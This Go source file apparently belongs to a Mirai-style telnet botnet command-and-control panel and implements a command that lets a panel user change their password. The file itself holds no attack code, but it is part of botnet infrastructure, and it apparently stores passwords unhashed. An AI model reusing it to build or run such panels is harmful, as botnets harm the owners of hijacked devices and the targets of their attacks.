package user

import (
	"advanced-telnet-cnc/source/database"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"passwd", "changepass", "passchange"},
		Description: "Changes your account password.",
		Admin:       false,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			pass, err := session.Reader.MiraiRead("New Password: ", false)
			if err != nil {
				return err
			}

			if len(pass) < 4 {
				return session.Println("\x1b[91mError: Password must be at least 4 characters long.")
			}

			for tries := 1; tries <= 3; tries++ {
				repeat, err := session.Reader.MiraiRead("Repeat Password: ", false)
				if err != nil {
					return err
				}

				if pass == repeat {
					session.UserProfile.Password = pass
					err := database.SetUser(session.UserProfile)
					if err != nil {
						return session.Println("\x1b[91mError: Failed to update password in the database.")
					}
					return session.Println("\x1b[92mPassword successfully changed.")
				}

				remaining := 3 - tries
				if remaining > 0 {
					session.Printf("\x1b[91mPasswords do not match. You have %d tries left.\r\n", remaining)
				} else {
					session.Println("\x1b[91mPasswords do not match. Max tries reached.")
				}
			}

			return nil
		},
	})
}
